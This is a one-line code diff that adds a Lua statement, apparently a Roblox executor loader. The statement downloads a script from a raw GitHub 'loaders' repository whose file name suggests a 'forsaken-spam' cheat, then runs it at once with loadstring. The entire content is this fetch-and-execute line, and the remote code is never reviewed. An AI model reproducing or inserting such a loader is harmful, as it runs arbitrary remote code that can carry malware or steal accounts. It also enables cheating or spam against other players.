@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/forsaken-spam0-ga31poxfm9zckb.lua"))()
